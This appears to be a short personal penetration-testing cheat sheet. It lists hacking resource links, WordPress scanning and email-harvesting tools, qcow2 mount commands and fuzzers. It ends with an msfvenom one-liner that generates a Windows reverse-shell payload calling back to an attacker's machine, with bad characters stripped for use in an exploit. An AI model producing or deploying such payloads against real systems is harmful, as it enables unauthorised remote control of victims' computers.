# MOTHERS OF ALL
https://github.com/Hack-with-Github/Awesome-Hacking

# Evaluate WordPress
https://github.com/sammanthp007/WordPress-Pentesting-Setup
$ wpscan

#CRAWL
git clone https://github.com/killswitch-GUI/SimplyEmail.git
$ theharvester

# Mount qcow2 files
modprobe nbd
qemu-nbd --connect=/dev/nbd0 /path/to/qcow2file
mount /dev/nbd0p1 mnt

# FUZZER
https://github.com/mirrorer/afl.git
https://github.com/jtpereyda/boofuzz.git # pip install boofuzz

## TRIDACTYL direct Download
https://tridactyl.cmcaine.co.uk/betas/tridactyl-latest.xpi

## Windows reverse shell
msfvenom -p windows/shell_reverse_tcp LHOST=eth0 LPORT=8080 EXITFUNC=thread \
-f raw -b "\x00\x09\x0d\x0a\x20\xff" -n 32 > warhead.txt
